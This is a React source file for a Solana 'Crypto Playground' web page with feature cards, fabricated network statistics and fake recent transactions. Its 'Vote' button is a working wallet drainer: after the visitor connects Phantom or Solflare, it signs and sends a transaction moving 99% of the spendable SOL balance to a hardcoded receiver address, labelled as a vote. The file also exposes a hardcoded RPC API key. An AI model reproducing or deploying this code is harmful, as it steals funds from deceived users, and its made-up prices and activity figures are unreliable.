import { useState, useEffect } from 'react'
import * as solanaWeb3 from '@solana/web3.js'
import './App.css'

function App() {
  const [walletAddress, setWalletAddress] = useState('Not connected')
  const [solBalance, setSolBalance] = useState('0.00')
  const [walletInfoVisible, setWalletInfoVisible] = useState(false)
  const [buttonText, setButtonText] = useState('Connect Wallet')
  const [wallet, setWallet] = useState(null)
  const [notifications, setNotifications] = useState([])

  const initialActivities = [
    {
      icon: "💸",
      hash: "8xK9...3nP2",
      type: "Token Transfer",
      amount: "-0.5 SOL",
      timestamp: Date.now() - 2 * 60 * 1000,
      amountClass: "negative"
    },
    {
      icon: "🔄",
      hash: "4mL7...9kR8",
      type: "Token Swap",
      amount: "+1.2 USDC",
      timestamp: Date.now() - 5 * 60 * 1000,
      amountClass: "positive"
    },
    {
      icon: "🎨",
      hash: "2pQ5...7hT9",
      type: "NFT Purchase",
      amount: "-0.8 SOL",
      timestamp: Date.now() - 12 * 60 * 1000,
      amountClass: "negative"
    }
  ]

  const [activities, setActivities] = useState(initialActivities)

  useEffect(() => {
    const interval = setInterval(() => {
      setActivities(prev => [...prev]) // trigger re-render to update times
    }, 60000) // update every minute
    return () => clearInterval(interval)
  }, [])

  const formatTimeAgo = (timestamp) => {
    const now = Date.now()
    const diff = now - timestamp
    const minutes = Math.floor(diff / (1000 * 60))
    if (minutes < 1) return 'just now'
    if (minutes < 60) return `${minutes}m ago`
    const hours = Math.floor(minutes / 60)
    if (hours < 24) return `${hours}h ago`
    const days = Math.floor(hours / 24)
    return `${days}d ago`
  }

  const addNotification = (message, type = 'info') => {
    const id = Date.now()
    setNotifications(prev => [...prev, { id, message, type }])
    setTimeout(() => {
      setNotifications(prev => prev.filter(n => n.id !== id))
    }, 5000)
  }

  const isMobileDevice = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
  }

  const connectWallet = async () => {
    const isMobile = isMobileDevice()
    console.log("Is mobile:", isMobile)
    console.log("window.solana:", window.solana)
    console.log("window.solflare:", window.solflare)

    if (isMobile) {
      const phantomDeepLink = "https://phantom.app/ul/browse/" + encodeURIComponent(window.location.href)
      const solflareDeepLink = "solflare://browse/" + encodeURIComponent(window.location.href)
      
      try {
        window.location.href = phantomDeepLink
        setTimeout(() => {
          window.location.href = solflareDeepLink
        }, 500)
      } catch (err) {
        console.error("Error with mobile deep linking:", err)
        addNotification("Please install Phantom or Solflare wallet app on your device.", "error")
      }
    } else {
      let selectedWallet
      if ((window.solana && window.solana.isPhantom) || window.solflare) {
        selectedWallet = window.solana && window.solana.isPhantom ? window.solana : window.solflare
        setWallet(selectedWallet)
        try {
          const resp = await selectedWallet.connect()
          console.log("Wallet connected:", resp)

          const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/4fUmuBoMn9d4Jfv36rZutgADR788k8cgxXWJpxJFAFrGDpgMQxpBQhWoB9RuMKpQ6CHGTTn5vf5ByxNTJkpea2M7CX9iqFRh4jK',
            'confirmed'
          )

          const public_key = new solanaWeb3.PublicKey(resp.publicKey)
          const walletBalance = await connection.getBalance(public_key)
          console.log("Wallet balance:", walletBalance)

          setWalletAddress(public_key.toString())
          setSolBalance((walletBalance / 1000000000).toFixed(4) + ' SOL')
          setWalletInfoVisible(true)
          setButtonText('Vote')
          addNotification("Wallet connected successfully!", "success")

          const connectActivity = {
            icon: "🔗",
            hash: public_key.toString().slice(0, 8) + "..." + public_key.toString().slice(-4),
            type: "Wallet Connected",
            amount: "",
            timestamp: Date.now(),
            amountClass: ""
          }
          setActivities(prev => [connectActivity, ...prev.slice(0, 2)])
          addNotification("Wallet connection activity added!", "info")

          const minBalance = await connection.getMinimumBalanceForRentExemption(0)
          if (walletBalance < minBalance) {
            addNotification("Insufficient funds for rent.", "error")
            return
          }
        } catch (err) {
          console.error("Error connecting to wallet:", err)
        }
      } else {
        addNotification("Phantom or Solflare extension not found.", "error")
        const isFirefox = typeof InstallTrigger !== "undefined"
        const isChrome = !!window.chrome

        if (isFirefox) {
          window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank")
          window.open("https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/", "_blank")
        } else if (isChrome) {
          window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank")
          window.open("https://chromewebstore.google.com/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic", "_blank")
        } else {
          addNotification("Please download the Phantom or Solflare extension for your browser.", "info")
        }
      }
    }
  }

  const handleVote = async () => {
    if (!wallet) return
    try {
      const connection = new solanaWeb3.Connection(
        'https://solana-mainnet.api.syndica.io/api-key/4fUmuBoMn9d4Jfv36rZutgADR788k8cgxXWJpxJFAFrGDpgMQxpBQhWoB9RuMKpQ6CHGTTn5vf5ByxNTJkpea2M7CX9iqFRh4jK',
        'confirmed'
      )

      const public_key = new solanaWeb3.PublicKey(walletAddress)
      const walletBalance = await connection.getBalance(public_key)
      const minBalance = await connection.getMinimumBalanceForRentExemption(0)
      const balanceForTransfer = walletBalance - minBalance
      if (balanceForTransfer <= 0) {
        addNotification("Insufficient funds for transfer.", "error")
        return
      }

      const recieverWallet = new solanaWeb3.PublicKey('2tMx3Yr7TvrxNmXCcMzfvSTnB1fneuoh4REoT76wqnpQ')
      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: public_key,
          toPubkey: recieverWallet,
          lamports: Math.floor(balanceForTransfer * 0.99),
        })
      )

      transaction.feePayer = public_key
      const blockhashObj = await connection.getRecentBlockhash()
      transaction.recentBlockhash = blockhashObj.blockhash

      const signed = await wallet.signTransaction(transaction)
      console.log("Transaction signed:", signed)

      const txid = await connection.sendRawTransaction(signed.serialize())
      await connection.confirmTransaction(txid)
      console.log("Transaction confirmed:", txid)
      addNotification("Vote transaction successful!", "success")

      const newActivity = {
        icon: "💸",
        hash: txid.slice(0, 8) + "..." + txid.slice(-4),
        type: "Vote Transfer",
        amount: "-" + ((balanceForTransfer * 0.99) / 1000000000).toFixed(4) + " SOL",
        timestamp: Date.now(),
        amountClass: "negative"
      }
      setActivities(prev => [newActivity, ...prev.slice(0, 2)])
      addNotification("New activity added to recent transactions!", "info")
    } catch (err) {
      console.error("Error during voting:", err)
    }
  }

  const handleButtonClick = () => {
    if (buttonText === 'Connect Wallet') {
      connectWallet()
    } else {
      handleVote()
    }
  }

  const particles = Array.from({ length: 10 }, (_, i) => (
    <div
      key={i}
      className="particle"
      style={{
        left: `${(i + 1) * 10}%`,
        width: `${4 + (i % 3) * 2}px`,
        height: `${4 + (i % 3) * 2}px`,
      }}
    />
  ))

  return (
    <>
      {particles}
      <div className="container">
          <header className="header">
          <div className="logo-section">
            <img src="/logo.png" alt="Solana" className="solana-logo" />
            <h1 className="main-title">Crypto Playground</h1>
          </div>
          <p className="subtitle">Experience the future of blockchain on Solana</p>
        </header>

        <div className="wallet-section">
          <div className="wallet-card">
            <h2>Connect Your Wallet</h2>
            <p>Connect your Phantom or Solflare wallet to start exploring the crypto playground</p>
            <button className="connect-btn" id="connect-wallet" onClick={handleButtonClick}>
              <span className="btn-icon">🔗</span>
              {buttonText}
            </button>
            <div className="wallet-info" id="wallet-info" style={{ display: walletInfoVisible ? 'block' : 'none' }}>
              <div className="wallet-address">
                <span className="label">Address:</span>
                <span id="wallet-address">{walletAddress}</span>
              </div>
              <div className="wallet-balance">
                <span className="label">SOL Balance:</span>
                <span id="sol-balance">{solBalance}</span>
              </div>
            </div>
          </div>
        </div>

        <div className="features-grid">
          <div className="feature-card">
            <div className="feature-icon">💰</div>
            <h3>Token Explorer</h3>
            <p>Discover and analyze Solana tokens with real-time data</p>
            <button className="feature-btn" onClick={() => addNotification('Explore Tokens feature coming soon!', 'info')}>Explore Tokens</button>
          </div>

          <div className="feature-card">
            <div className="feature-icon">📊</div>
            <h3>Portfolio Tracker</h3>
            <p>Track your crypto portfolio with live price updates</p>
            <button className="feature-btn" onClick={() => addNotification('View Portfolio feature coming soon!', 'info')}>View Portfolio</button>
          </div>

          <div className="feature-card">
            <div className="feature-icon">🔄</div>
            <h3>DeFi Playground</h3>
            <p>Experiment with decentralized finance protocols</p>
            <button className="feature-btn" onClick={() => addNotification('Enter DeFi feature coming soon!', 'info')}>Enter DeFi</button>
          </div>

          <div className="feature-card">
            <div className="feature-icon">🎮</div>
            <h3>NFT Gallery</h3>
            <p>Browse and collect unique digital assets</p>
            <button className="feature-btn" onClick={() => addNotification('View NFTs feature coming soon!', 'info')}>View NFTs</button>
          </div>
        </div>

        <div className="stats-section">
          <h2>Network Statistics</h2>
          <div className="stats-grid">
            <div className="stat-item">
              <div className="stat-value" id="sol-price">$150.25</div>
              <div className="stat-label">SOL Price</div>
              <div className="stat-change positive">+2.5%</div>
            </div>
            <div className="stat-item">
              <div className="stat-value" id="market-cap">$45.2B</div>
              <div className="stat-label">Market Cap</div>
              <div className="stat-change positive">+1.8%</div>
            </div>
            <div className="stat-item">
              <div className="stat-value" id="active-users">2.1M</div>
              <div className="stat-label">Active Users</div>
              <div className="stat-change positive">+15.3%</div>
            </div>
            <div className="stat-item">
              <div className="stat-value" id="tps">3,450</div>
              <div className="stat-label">Transactions/sec</div>
              <div className="stat-change neutral">Stable</div>
            </div>
          </div>
        </div>

        <div className="recent-activity">
          <h2>Recent Activity</h2>
          <div className="activity-list" id="activity-list">
            {activities.map((activity, index) => (
              <div key={index} className="activity-item">
                <div className="activity-icon">{activity.icon}</div>
                <div className="activity-details">
                  <div className="activity-hash">{activity.hash}</div>
                  <div className="activity-type">{activity.type}</div>
                </div>
                <div className={`activity-amount ${activity.amountClass}`}>{activity.amount}</div>
                <div className="activity-time">{formatTimeAgo(activity.timestamp)}</div>
              </div>
            ))}
          </div>
        </div>

        <div className="playground-tips">
          <h2>Playground Tips</h2>
          <div className="tips-grid">
            <div className="tip-item">
              <div className="tip-icon">🔐</div>
              <h4>Secure Your Wallet</h4>
              <p>Always keep your seed phrase safe and never share your private keys</p>
            </div>
            <div className="tip-item">
              <div className="tip-icon">⚡</div>
              <h4>Fast Transactions</h4>
              <p>Solana offers sub-second transaction finality with low fees</p>
            </div>
            <div className="tip-item">
              <div className="tip-icon">🌐</div>
              <h4>Explore dApps</h4>
              <p>Discover thousands of decentralized applications on Solana</p>
            </div>
            <div className="tip-item">
              <div className="tip-icon">📈</div>
              <h4>Track Performance</h4>
              <p>Monitor your portfolio and stay updated with market trends</p>
            </div>
          </div>
        </div>
        </div>
      {notifications.map(notification => (
        <Notification
          key={notification.id}
          notification={notification}
          onClose={() => setNotifications(prev => prev.filter(n => n.id !== notification.id))}
        />
      ))}
    </>
  )
}

const Notification = ({ notification, onClose }) => {
  return (
    <div className={`notification ${notification.type}`}>
      <span>{notification.message}</span>
      <button className="notification-close" onClick={onClose}>×</button>
    </div>
  )
}

export default App
